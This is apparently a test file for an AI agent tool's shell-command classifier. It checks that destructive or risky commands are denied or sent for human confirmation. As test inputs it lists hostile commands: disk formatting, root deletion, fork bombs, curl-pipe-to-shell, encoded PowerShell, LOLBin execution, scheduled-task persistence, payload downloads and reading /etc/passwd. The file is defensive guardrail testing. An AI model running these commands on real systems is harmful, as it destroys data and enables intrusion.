// shell-tools classifyCommand 命令分类器测试
//
// 覆盖 src/main/tools/shell-tools.ts 的 classifyCommand 纯函数：
// - 空命令 → deny BAD_ARGS
// - DENY_RULES 黑名单（format/diskpart/mkfs/shutdown/bcdedit/cipher/reg delete/系统目录删除/fork炸弹）
// - ROOT_DELETE_RE 裸根递归删除
// - 工作目录外绝对路径（Windows 盘符 / POSIX 系统目录）→ confirm DANGEROUS_OUTSIDE
// - CONFIRM_RULES 危险特征（删除/移动/重定向/kill/权限/账号/注册表/push/下载执行/编码/提权/穿越/家目录）
// - 复合命令取最严（deny > confirm > allow）
// - Windows ^ 转义符绕过防护（platform 切换）
//
// 策略：纯函数直接 import；mock appConfigRepo 避开 db→electron 链。
// platform 切换用 Object.defineProperty + afterEach 还原。
import { describe, it, expect, vi, afterEach } from 'vitest'

// shell-config / fs-tools 顶层 import appConfigRepo → db → electron，vitest 下崩，mock 掉
vi.mock('../src/main/db/repositories/app-config.repo', () => ({
  appConfigRepo: { get: () => null, set: () => {}, delete: () => {} }
}))

import { classifyCommand, findDangerRanges } from '../src/main/tools/shell-tools'

const WS = 'C:\\agent-workspace'

// platform 切换（process.platform 只读，需 Object.defineProperty）
const realPlatform = Object.getOwnPropertyDescriptor(process, 'platform')
function setPlatform(v: string): void {
  Object.defineProperty(process, 'platform', { value: v, configurable: true })
}
afterEach(() => {
  if (realPlatform) Object.defineProperty(process, 'platform', realPlatform)
})

describe('classifyCommand', () => {
  describe('空命令 → deny BAD_ARGS', () => {
    it('空字符串', () => {
      expect(classifyCommand('', WS)).toEqual({ decision: 'deny', reason: 'BAD_ARGS' })
    })
    it('纯空白', () => {
      expect(classifyCommand('   \t  ', WS)).toEqual({ decision: 'deny', reason: 'BAD_ARGS' })
    })
    it('null/undefined 归一为空串', () => {
      expect(classifyCommand(null as unknown as string, WS)).toEqual({ decision: 'deny', reason: 'BAD_ARGS' })
      expect(classifyCommand(undefined as unknown as string, WS)).toEqual({ decision: 'deny', reason: 'BAD_ARGS' })
    })
  })

  describe('deny 黑名单 DENY_RULES', () => {
    it('format 带盘符 → BLOCKED_FORMAT', () => {
      expect(classifyCommand('format c:', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_FORMAT' })
      expect(classifyCommand('format.com D:', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_FORMAT' })
    })
    it('npm run format 无盘符不命中', () => {
      expect(classifyCommand('npm run format', WS).decision).toBe('allow')
    })
    it('diskpart → BLOCKED_DISKPART', () => {
      expect(classifyCommand('diskpart', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_DISKPART' })
    })
    it('mkfs → BLOCKED_MKFS', () => {
      expect(classifyCommand('mkfs.ext4 /dev/sda', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_MKFS' })
    })
    it('shutdown/reboot/halt/poweroff → BLOCKED_SHUTDOWN', () => {
      expect(classifyCommand('shutdown /s', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_SHUTDOWN' })
      expect(classifyCommand('reboot', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_SHUTDOWN' })
      expect(classifyCommand('halt', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_SHUTDOWN' })
    })
    it('bcdedit → BLOCKED_BOOTCFG', () => {
      expect(classifyCommand('bcdedit /set', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_BOOTCFG' })
    })
    it('cipher /w → BLOCKED_CIPHER_WIPE（无 /w 不命中）', () => {
      expect(classifyCommand('cipher /w:c:', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_CIPHER_WIPE' })
      expect(classifyCommand('cipher', WS).decision).toBe('allow')
    })
    it('reg delete 关键蜂巢 → BLOCKED_REG_HIVE', () => {
      expect(classifyCommand('reg delete HKLM\\SAM\\x /f', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_REG_HIVE' })
      expect(classifyCommand('reg delete HKCU\\SYSTEM\\y /f', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_REG_HIVE' })
    })
    it('递归删系统目录 → BLOCKED_SYSTEM_DELETE', () => {
      expect(classifyCommand('rm -rf /mnt/c/Windows', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_SYSTEM_DELETE' })
      expect(classifyCommand('del %SystemRoot%\\system32', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_SYSTEM_DELETE' })
      expect(classifyCommand('del /f /s c:\\windows\\system32', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_SYSTEM_DELETE' })
    })
    it('fork 炸弹 → BLOCKED_FORKBOMB', () => {
      expect(classifyCommand(':(){ :|:& };:', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_FORKBOMB' })
      expect(classifyCommand('%0|%0', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_FORKBOMB' })
    })
  })

  describe('deny 裸根递归删除 ROOT_DELETE_RE', () => {
    it('rm -rf 裸根 → BLOCKED_ROOT_DELETE', () => {
      expect(classifyCommand('rm -rf /', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_ROOT_DELETE' })
      expect(classifyCommand('rm -rf /*', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_ROOT_DELETE' })
    })
    it('盘符根删除 → BLOCKED_ROOT_DELETE', () => {
      expect(classifyCommand('del C:\\', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_ROOT_DELETE' })
      expect(classifyCommand('rd C:\\*', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_ROOT_DELETE' })
    })
  })

  describe('confirm 工作目录外路径 → DANGEROUS_OUTSIDE', () => {
    it('Windows 盘符路径不在 workspace → confirm', () => {
      expect(classifyCommand('dir D:\\data', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OUTSIDE' })
    })
    it('Windows 盘符路径在 workspace 内 → 不命中（继续判其他规则）', () => {
      // type 不在 confirm 规则，工作目录内 → allow
      expect(classifyCommand('type C:\\agent-workspace\\file.txt', WS).decision).toBe('allow')
    })
    it('URL 不误判为盘符路径', () => {
      // http://example.com 的 p: 前是字母非分隔符，不匹配 WIN_ABS_PATH_RE
      expect(classifyCommand('curl http://example.com/page', WS).decision).toBe('allow')
    })
    it('POSIX 系统目录 → confirm', () => {
      expect(classifyCommand('cat /etc/passwd', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OUTSIDE' })
      expect(classifyCommand('ls /usr/bin', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OUTSIDE' })
      expect(classifyCommand('ls /System/Library', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OUTSIDE' })
    })
  })

  describe('confirm 危险特征 CONFIRM_RULES', () => {
    it('删除命令 → DANGEROUS_DELETE', () => {
      expect(classifyCommand('rm file', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_DELETE' })
      expect(classifyCommand('del file', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_DELETE' })
      expect(classifyCommand('rmdir dir', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_DELETE' })
      expect(classifyCommand('remove-item x', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_DELETE' })
    })
    it('移动 → DANGEROUS_OVERWRITE', () => {
      expect(classifyCommand('mv a b', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OVERWRITE' })
      expect(classifyCommand('move a b', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OVERWRITE' })
    })
    it('强制复制/镜像 → DANGEROUS_OVERWRITE', () => {
      expect(classifyCommand('cp -f src dst', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OVERWRITE' })
      expect(classifyCommand('copy /y a b', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OVERWRITE' })
      expect(classifyCommand('robocopy src dst', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OVERWRITE' })
    })
    it('输出重定向 → DANGEROUS_OVERWRITE', () => {
      expect(classifyCommand('echo hi > file', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OVERWRITE' })
    })
    it('进程杀 → DANGEROUS_KILL', () => {
      expect(classifyCommand('taskkill /pid 1', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_KILL' })
      expect(classifyCommand('kill 123', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_KILL' })
      expect(classifyCommand('pkill node', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_KILL' })
    })
    it('权限修改 → DANGEROUS_PERMISSION', () => {
      expect(classifyCommand('chmod 777 f', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_PERMISSION' })
      expect(classifyCommand('icacls x /grant', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_PERMISSION' })
    })
    it('账号管理 → DANGEROUS_ACCOUNT', () => {
      expect(classifyCommand('net user bob', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_ACCOUNT' })
      expect(classifyCommand('useradd bob', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_ACCOUNT' })
      expect(classifyCommand('passwd bob', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_ACCOUNT' })
    })
    it('注册表写入/导入 → DANGEROUS_REGISTRY', () => {
      expect(classifyCommand('reg add HKLM\\x /v y', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_REGISTRY' })
      expect(classifyCommand('reg import f.reg', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_REGISTRY' })
    })
    it('git push → DANGEROUS_PUBLISH（status 不命中）', () => {
      expect(classifyCommand('git push', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_PUBLISH' })
      expect(classifyCommand('git status', WS).decision).toBe('allow')
    })
    it('下载即执行 → DANGEROUS_PIPE_EXEC', () => {
      expect(classifyCommand('curl http://x | sh', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_PIPE_EXEC' })
      expect(classifyCommand('iex (gci)', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_PIPE_EXEC' })
    })
    it('PowerShell 编码命令 → DANGEROUS_ENCODED', () => {
      expect(classifyCommand('pwsh -enc AAAA', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_ENCODED' })
      expect(classifyCommand('powershell -encodedcommand AAAA', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_ENCODED' })
    })
    it('提权动词 → DANGEROUS_PRIVILEGE', () => {
      // sudo ls：ls 不在其他 confirm 规则，命中 DANGEROUS_PRIVILEGE；
      // sudo rm 会先命中 DANGEROUS_DELETE（规则顺序在前）
      expect(classifyCommand('sudo ls', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_PRIVILEGE' })
      expect(classifyCommand('runas /user:admin cmd', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_PRIVILEGE' })
    })
    it('目录穿越 → DANGEROUS_TRAVERSAL', () => {
      expect(classifyCommand('cd ../', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_TRAVERSAL' })
      expect(classifyCommand('cat a/../b', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_TRAVERSAL' })
    })
    it('家目录/环境变量 → DANGEROUS_OUTSIDE', () => {
      // ~ 后需跟 / 或 \ 才命中 ~[\\/]；纯 ~ 不命中（正则边界设计如此）
      expect(classifyCommand('cd ~/', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OUTSIDE' })
      expect(classifyCommand('echo $HOME', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OUTSIDE' })
      expect(classifyCommand('dir %USERPROFILE%', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_OUTSIDE' })
    })
  })

  describe('复合命令取最严', () => {
    it('安全 + 危险片段 → confirm（取最严）', () => {
      expect(classifyCommand('ls && rm file', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_DELETE' })
    })
    it('安全 + deny 片段 → deny（deny 优先）', () => {
      expect(classifyCommand('echo hi && format c:', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_FORMAT' })
    })
    it('全安全片段 → allow', () => {
      expect(classifyCommand('echo hi && echo bye', WS).decision).toBe('allow')
    })
    it('管道分隔也拆分', () => {
      expect(classifyCommand('ls | rm file', WS)).toEqual({ decision: 'confirm', reason: 'DANGEROUS_DELETE' })
    })
  })

  describe('confirm SEC-9 绕过特征（此前在 auto-safe 下会被判 allow）', () => {
    it('解释器一行式 → DANGEROUS_INTERPRETER_INLINE', () => {
      for (const cmd of [
        'python -c "import os"',
        'py -m http.server',
        'node -e "process.exit(1)"',
        'deno eval "fetch(url)"',
        "perl -e 'print 1'",
        'php -r "system($_GET[0]);"',
        'powershell -c "Get-Process | Select-Object -First 1"'
      ]) {
        const r = classifyCommand(cmd, WS)
        expect(r.reason, cmd).toBe('DANGEROUS_INTERPRETER_INLINE')
      }
    })

    it('多重命中时按声明顺序取 reason，但判定必为 confirm（不因先匹配而放行）', () => {
      // perl -e 里含 rm -rf：先命中 DANGEROUS_DELETE，仍要求人工确认
      expect(classifyCommand("perl -e 'system(q{rm -rf /})'", WS)).toEqual({
        decision: 'confirm',
        reason: 'DANGEROUS_DELETE'
      })
    })

    it('Windows 执行宿主 → DANGEROUS_EXEC_HOST', () => {
      for (const cmd of ['mshta http://x/a.hta', 'rundll32 shell32.dll,Open', 'certutil -decode b64 exe', 'regsvr32 /s script.sct']) {
        expect(classifyCommand(cmd, WS).reason, cmd).toBe('DANGEROUS_EXEC_HOST')
      }
    })

    it('间接建进程 / 持久化 → DANGEROUS_PERSISTENCE', () => {
      for (const cmd of [
        'schtasks /create /tn x /tr calc',
        'wmic process call create calc',
        'sc create evil binPath= x',
        'powershell Start-Process calc'
      ]) {
        expect(classifyCommand(cmd, WS).reason, cmd).toBe('DANGEROUS_PERSISTENCE')
      }
    })

    it('下载落盘 → DANGEROUS_DOWNLOAD_WRITE', () => {
      expect(classifyCommand('curl -o payload.exe http://x', WS).reason).toBe('DANGEROUS_DOWNLOAD_WRITE')
      expect(classifyCommand('wget --output-document a.sh http://x', WS).reason).toBe('DANGEROUS_DOWNLOAD_WRITE')
      expect(classifyCommand('iwr http://x -outfile a.ps1', WS).reason).toBe('DANGEROUS_DOWNLOAD_WRITE')
    })

    it('deny 优先级仍最高：解释器一行式里的毁灭命令走黑名单', () => {
      expect(classifyCommand('python -c "import shutil"', WS).decision).toBe('confirm')
      expect(classifyCommand('node -e "x" && diskpart', WS)).toEqual({
        decision: 'deny',
        reason: 'BLOCKED_DISKPART'
      })
    })

    it('普通脚本运行与常用命令不误伤（仍是 allow）', () => {
      for (const cmd of ['node server.js', 'python build.py', 'npm run build', 'git status', 'ls -la', 'node --version']) {
        expect(classifyCommand(cmd, WS).decision, cmd).toBe('allow')
      }
    })
  })

  describe('allow 安全命令', () => {
    it('ls → allow', () => {
      expect(classifyCommand('ls -la', WS).decision).toBe('allow')
    })
    it('git status → allow', () => {
      expect(classifyCommand('git status', WS).decision).toBe('allow')
    })
    it('npm install → allow', () => {
      expect(classifyCommand('npm install', WS).decision).toBe('allow')
    })
    it('echo 无重定向 → allow', () => {
      expect(classifyCommand('echo hello', WS).decision).toBe('allow')
    })
  })

  describe('Windows ^ 转义符绕过防护', () => {
    it('win32 下 ^ 被去除 → format c^: 命中 BLOCKED_FORMAT', () => {
      setPlatform('win32')
      expect(classifyCommand('format c^:', WS)).toEqual({ decision: 'deny', reason: 'BLOCKED_FORMAT' })
    })
    it('linux 下 ^ 不处理 → format c^: 不命中盘符', () => {
      setPlatform('linux')
      // c^: 不匹配盘符正则（^ 在中间），format 无盘符不命中 → 走其他规则 → allow
      expect(classifyCommand('format c^:', WS).decision).toBe('allow')
    })
  })
})

describe('findDangerRanges — 审批弹窗危险片段高亮区间', () => {
  it('命中 rm 删除操作', () => {
    const cmd = 'rm -rf node_modules'
    const ranges = findDangerRanges(cmd)
    expect(ranges.length).toBeGreaterThanOrEqual(1)
    // 命中区间必须对原始命令下标对齐，且覆盖 'rm'
    expect(ranges.some((r) => cmd.slice(r.start, r.end).includes('rm'))).toBe(true)
  })

  it('命中 curl|sh 下载即执行管道', () => {
    const cmd = 'curl https://x.com/a.sh | sh'
    const ranges = findDangerRanges(cmd)
    expect(ranges.length).toBeGreaterThanOrEqual(1)
    expect(ranges.some((r) => cmd.slice(r.start, r.end).includes('curl'))).toBe(true)
  })

  it('多段命中合并且按起点升序', () => {
    const cmd = 'rm a.txt && taskkill /f /im app.exe'
    const ranges = findDangerRanges(cmd)
    expect(ranges.length).toBeGreaterThanOrEqual(2)
    for (let i = 1; i < ranges.length; i++) {
      expect(ranges[i]!.start).toBeGreaterThanOrEqual(ranges[i - 1]!.end)
    }
  })

  it('相邻/重叠区间合并为一个', () => {
    // sudo 与 rm 各自命中，中间空格不重叠 → 两段；重复规则命中同一片段 → 不重复出现
    const ranges = findDangerRanges('sudo rm x')
    const texts = ranges.map((r) => 'sudo rm x'.slice(r.start, r.end))
    expect(new Set(texts).size).toBe(texts.length)
  })

  it('安全命令 / 空命令返回空数组', () => {
    expect(findDangerRanges('ls -la')).toEqual([])
    expect(findDangerRanges('')).toEqual([])
    expect(findDangerRanges('   ')).toEqual([])
  })
})
